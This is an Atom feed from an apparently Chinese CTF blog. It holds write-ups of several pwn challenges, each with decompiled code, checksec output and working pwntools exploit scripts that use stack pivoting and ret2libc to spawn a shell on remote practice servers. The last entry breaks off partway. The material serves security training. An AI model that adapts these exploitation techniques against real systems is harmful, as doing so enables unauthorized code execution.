<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>EUREKA!</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2023-04-12T14:26:06.812Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>EUREKA🍊</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ciscn_2019_es_2 复现</title>
    <link href="https://www.fomal.cc/posts/1514ec99.html"/>
    <id>https://www.fomal.cc/posts/1514ec99.html</id>
    <published>2023-04-12T14:26:24.962Z</published>
    <updated>2023-04-12T14:26:06.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>这题涉及到了栈劫持操作,难度开始高起来了.</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>没有开别的保护,但是利用栈溢出漏洞最多也就覆盖到返回地址,这个时候就需要利用到栈迁移的手法跳转到一个缓冲区来布置更长的ROP链,那么最好的地方就是原来的<code>vul()</code>的<code>s</code>,因为本来payload就是传到<code>s</code>的,我们先把<code>ebp</code>劫持到<code>s</code>开头的四个字节,然后在下四个字节布置<code>system()</code>的地址,再后四个字节随便输一个返回地址(已经不用再跳转了),再后的参数位置(四字节大小)填上再后面第一个的地址,参数位置后布置上<code>'/bin/sh\x00'</code>,再把末尾的<code>old_ebp</code>和<code>ret</code>修改成<code>s</code>的开头和<code>leave;ret</code>的地址.</p><p>如下图:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">&#x27;aaaa&#x27;</span>|system|<span class="string">&#x27;bbbb&#x27;</span>|bin_sh_addr|<span class="string">&#x27;/bin/sh\x00&#x27;</span>|padding|&amp;s[0]|leave_ret</span><br><span class="line">  0x4    0x4    0x4       0x4          0x8       0x20    0x4    0x4</span><br><span class="line">old_ebp-0x38                       old_ebp-0x28                      (对应的栈的地址)</span><br></pre></td></tr></table></figure><p>这个payload的构造已经很明确了,但是<code>&amp;s[0]</code>却还不知道,怎么办呢?既然是在栈上,刚好会调用<code>printf()</code>,我们前面我们把<code>ebp</code>前面全部填得剩一个,再补上一个<code>b'B'</code>,不带截断符,注意这里的payload千万不要再用<code>io.sendline(payload)</code>发送,要用<code>io.send(payload)</code>防止截断.这样就会直接把<code>ebp</code>里存储的<code>old ebp</code>给泄露出来,如下图:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bg&gt; stack 25</span><br><span class="line">00:0000│ esp 0xffffcfc0 ◂— 0x0</span><br><span class="line">01:0004│     0xffffcfc4 —▸ 0xffffcfd0 ◂— &#x27;AAAA\n&#x27;</span><br><span class="line">02:0008│     0xffffcfc8 ◂— 0x30 /* &#x27;0&#x27; */</span><br><span class="line">03:000c│     0xffffcfcc ◂— 0x25 /* &#x27;%&#x27; */</span><br><span class="line">04:0010│ ecx 0xffffcfd0 ◂— &#x27;AAAA\n&#x27; ##这个是s的起始位置</span><br><span class="line">05:0014│     0xffffcfd4 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">06:0018│     0xffffcfd8 ◂— 0x0</span><br><span class="line">... ↓        5 skipped</span><br><span class="line">0c:0030│     0xffffcff0 —▸ 0x80486d8 ◂— push   edi /* &quot;Welcome, my friend. What&#x27;s your name?&quot; */</span><br><span class="line">0d:0034│     0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd298 ◂— &#x27;/home/akira/Desktop/pwn&#x27;</span><br><span class="line">0e:0038│ ebp 0xffffcff8 —▸ 0xffffd008 ◂— 0x0 ##这个被泄露出来</span><br></pre></td></tr></table></figure><p>计算一下发现泄露的<code>old ebp</code>和<code>s</code>的起始位置距离是<code>0x38</code>,所以到时候泄露<code>old esp</code>的要<code>-0x38</code>平衡一下.还有一个<code>leave;ret</code>用ROPgadget获取一下就可以了.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn --only <span class="string">&#x27;leave|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080484b8 : leave ; ret</span><br><span class="line">0x080483a6 : ret</span><br><span class="line">0x080484ce : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>最后附上exp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25767</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x28</span></span><br><span class="line">leave_ret=<span class="number">0x80484b8</span> </span><br><span class="line">system=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset-<span class="number">1</span>)+<span class="string">b&#x27;B&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_ebp=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(old_ebp))</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p32(system)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p32(old_ebp-<span class="number">0x28</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload+=cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload+=p32(old_ebp-<span class="number">0x38</span>)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;这题涉及到了栈劫持操作,难度开始高起来了.&lt;/p&gt;
&lt;h2 id=&quot;1-逆向&quot;&gt;1.逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa</summary>
      
    
    
    
    <category term="复现" scheme="https://www.fomal.cc/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>picoctf_2018_rop chain</title>
    <link href="https://www.fomal.cc/posts/cb01254c.html"/>
    <id>https://www.fomal.cc/posts/cb01254c.html</id>
    <published>2023-04-09T14:27:14.260Z</published>
    <updated>2023-04-09T14:39:01.414Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>给了几个花里胡哨的后门函数,不过没啥用,最后直接ret2libc3解决.</p><h2 id="1逆向">1逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win_function1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  win1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">win_function2</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)win1;</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; a1 == <span class="number">-1163220307</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    win2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( win1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong Argument. Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nope. Try a little bit harder.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">-559039827</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( win1 || win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your input&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = getegid();</span><br><span class="line">  setresgid(v4, v4, v4);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>惯例检查,发现窗口里没有后门,字串也没有想要的,直接ret2libc3解决,附上exp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29947</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x18</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;input&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;puts:&quot;</span>+(<span class="built_in">str</span>)(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;input&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;给了几个花里胡哨的后门函数,不过没啥用,最后直接ret2libc3解决.&lt;/p&gt;
&lt;h2 id=&quot;1逆向&quot;&gt;1逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>HarekazeCTF2019baby_rop2 WP</title>
    <link href="https://www.fomal.cc/posts/bc33d64d.html"/>
    <id>https://www.fomal.cc/posts/bc33d64d.html</id>
    <published>2023-04-09T14:08:34.943Z</published>
    <updated>2023-04-09T14:41:52.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>ret2libc3题目,用got泄露地址的时候遇到点问题,换了个got就ok了.</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>需要注意用<code>'\x00'</code>隔一下payload不然可能会被源程序的逻辑破坏掉.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29947</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">prt_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>] <span class="comment">##printf的got抽风了打印不出真实地址</span></span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x20</span>+<span class="number">0x8</span></span><br><span class="line">pop_ret=<span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>)+p64(pop_ret)+p64(read_got)+p64(prt_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">read_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>)+p64(pop_ret)+p64(bin_sh)+p64(system)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;ret2libc3题目,用got泄露地址的时候遇到点问题,换了个got就ok了.&lt;/p&gt;
&lt;h2 id=&quot;1-逆向&quot;&gt;1.逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_tell_me_something WP</title>
    <link href="https://www.fomal.cc/posts/dc642da6.html"/>
    <id>https://www.fomal.cc/posts/dc642da6.html</id>
    <published>2023-04-09T12:22:21.984Z</published>
    <updated>2023-04-09T14:39:01.412Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>x64下的ret2text,点击就送.</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">good_game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">9</span>]; <span class="comment">// [rsp+Fh] [rbp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf[<span class="number">0</span>] = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input your message:\n&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">256uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;I have received your message, Thank you!\n&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:  